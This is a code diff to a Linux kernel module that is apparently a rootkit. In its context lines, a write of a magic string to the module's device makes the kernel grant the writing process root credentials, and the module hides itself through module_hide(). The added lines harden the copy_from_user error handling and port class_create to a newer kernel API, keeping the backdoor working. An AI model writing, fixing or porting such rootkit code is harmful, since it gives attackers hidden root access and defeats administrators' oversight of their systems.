@@ -84,14 +84,26 @@ root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
   data = (char *) kmalloc (len + 1, GFP_KERNEL);
     
   if (data)
-    {
-      copy_from_user (data, buf, len);
-        if (memcmp(data, magic, 3) == 0)
+  {
+      unsigned long ret; // Declare a variable to store the return value
+
+      // Check the return value of copy_from_user
+      ret = copy_from_user (data, buf, len);
+      if (ret != 0) {
+          // Error occurred during copy; clean up and return
+          printk(KERN_ERR "root_write: Failed to copy %lu bytes from user\n", ret);
+          kfree(data);
+          return -EFAULT; // Return appropriate error code to user space
+      }
+      
+      // Data successfully copied, proceed with checks
+      if (memcmp(data, magic, 3) == 0)
 	  {
 	    if ((new_cred = prepare_creds ()) == NULL)
 	      {
 		printk ("Cannot prepare creds\n");
-		return 0;
+        kfree(data); // Clean up before returning on internal error
+		return 0; // Or return an appropriate error code like -ENOMEM
 	      }
 	    printk ("creating root creds now\n");
 	    V(new_cred->uid) = V(new_cred->gid) =  0;
@@ -108,6 +120,7 @@ root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
     }
         kfree(data);
       }
+
     else
       {
 	printk(KERN_ALERT "Unable to allocate memory");
@@ -124,7 +137,7 @@ root_init(void)
    module_hide();
 
    majorNumber = register_chrdev(0, DEVICE_NAME, &fops);
-   RangerDangerClass = class_create(THIS_MODULE, CLASS_NAME);
+   RangerDangerClass = class_create(CLASS_NAME);
    RangerDangerDevice = device_create(RangerDangerClass, NULL,
 				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
    if (IS_ERR(RangerDangerDevice))
